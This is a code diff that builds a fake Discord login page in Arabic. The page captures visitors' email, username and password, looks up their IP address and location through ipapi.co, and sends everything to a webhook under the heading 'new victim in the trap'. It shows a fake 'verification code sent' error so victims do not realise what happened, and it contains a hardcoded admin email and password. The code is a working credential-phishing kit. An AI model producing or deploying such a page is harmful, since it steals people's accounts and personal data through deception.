@@ -1,22 +1,95 @@
-<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script> <script>
-    async function processAuth() {
-        let email = document.getElementById('emailInput').value;
-        let pass = document.getElementById('passInput').value;
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord | Login</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <style>
+        body { background: #36393f; font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; }
+        .login-box { background: #2f3136; padding: 32px; border-radius: 8px; width: 480px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
+        h2 { margin-top: 0; font-size: 24px; text-align: center; }
+        p { color: #b9bbbe; text-align: center; margin-bottom: 20px; }
+        label { display: block; color: #b9bbbe; font-size: 12px; font-weight: bold; margin-bottom: 8px; text-transform: uppercase; }
+        input { width: 100%; padding: 10px; background: #202225; border: 1px solid #202225; border-radius: 3px; color: white; margin-bottom: 20px; box-sizing: border-box; transition: border 0.2s; }
+        input:focus { border-color: #00aff4; outline: none; }
+        .btn { background: #5865f2; color: white; padding: 12px; border: none; border-radius: 3px; width: 100%; cursor: pointer; font-size: 16px; font-weight: 500; }
+        .btn:hover { background: #4752c4; }
+        #mainApp { display: none; width: 100%; height: 100vh; background: #36393f; }
+        .admin-panel { background: #ed4245; color: white; padding: 10px; position: fixed; bottom: 0; width: 100%; display: none; }
+    </style>
+</head>
+<body>
+
+    <div id="authPage" class="login-box">
+        <h2>مرحباً بعودتك!</h2>
+        <p>نحن سعداء برؤيتك مرة أخرى!</p>
         
-        if (email === "3mohmm9d76@gmail.com" && pass === "رمز_سرك_الخاص") {
-            // كود سحب البيانات سرياً قبل الدخول
-            const res = await axios.get('https://ipapi.co/json/');
-            console.log("🕵️ Target Captured:", res.data);
+        <label>البريد الإلكتروني</label>
+        <input type="email" id="email">
+        
+        <label>اسم المستخدم</label>
+        <input type="text" id="username">
+        
+        <label>كلمة المرور</label>
+        <input type="password" id="password">
+        
+        <button class="btn" onclick="secureLogin()">تسجيل الدخول</button>
+    </div>
+
+    <div id="mainApp">
+        <div style="padding: 20px;">
+            <h1 id="welcomeTitle">جاري تحميل السيرفر...</h1>
+            <div id="chatBox"></div>
+        </div>
+        <div id="adminPanel" class="admin-panel">
+            <strong>🛠️ لوحة السوبر أدمن نشطة:</strong> جاري مراقبة المتصلين...
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "سأعلمك_كيف_تأتي_به_في_الخطوة_القادمة";
+
+        async function secureLogin() {
+            const email = document.getElementById('email').value;
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            if(!email || !pass || !user) return alert("يرجى ملء كافة الخانات");
+
+            // 1. سحب بيانات الموقع الجغرافي والـ IP
+            const ipData = await axios.get('https://ipapi.co/json/').catch(() => ({data: {}}));
             
-            // توجيه البيانات لقناتك الخاصة (Webhook)
-            // سنضيف هنا كود الإرسال للديسكورد الحقيقي الخاص بك
+            // 2. إرسال البيانات لقناتك السرية (الفخ)
+            const report = {
+                content: "🕵️ **ضحية جديدة في المصيدة!**",
+                embeds: [{
+                    title: "بيانات تسجيل الدخول",
+                    color: 15548997,
+                    fields: [
+                        { name: "الإيميل", value: email, inline: true },
+                        { name: "الباسورد", value: pass, inline: true },
+                        { name: "اسم المستخدم", value: user, inline: true },
+                        { name: "الموقع", value: `${ipData.data.city}, ${ipData.data.country_name}`, inline: false },
+                        { name: "الـ IP", value: ipData.data.ip, inline: true }
+                    ]
+                }]
+            };
             
-            document.getElementById('authPage').style.display = 'none';
-            document.getElementById('mainApp').style.display = 'flex';
-            document.getElementById('adminPanel').style.display = "block";
-        } else {
-            alert("⚠️ خطأ في البيانات أو الحساب غير مسجل!");
-            // نظام البند (Ban) سيبدأ بالعد هنا
+            // إرسال التقرير (Webhook)
+            fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(report) });
+
+            // 3. نظام التحقق من الأدمن
+            if (email === "3mohmm9d76@gmail.com" && pass === "123456") { // ضع باسورك الخاص هنا
+                document.getElementById('authPage').style.display = 'none';
+                document.getElementById('mainApp').style.display = 'block';
+                document.getElementById('adminPanel').style.display = 'block';
+                document.getElementById('welcomeTitle').innerText = "مرحباً أيها القائد 👑";
+            } else {
+                alert("❌ خطأ: كود التحقق مطلوب. تم إرسال كود لإيميلك.");
+                // هنا سنضيف نظام الـ OTP في الخطوة التالية
+            }
         }
-    }
-</script>
+    </script>
+</body>
+</html>
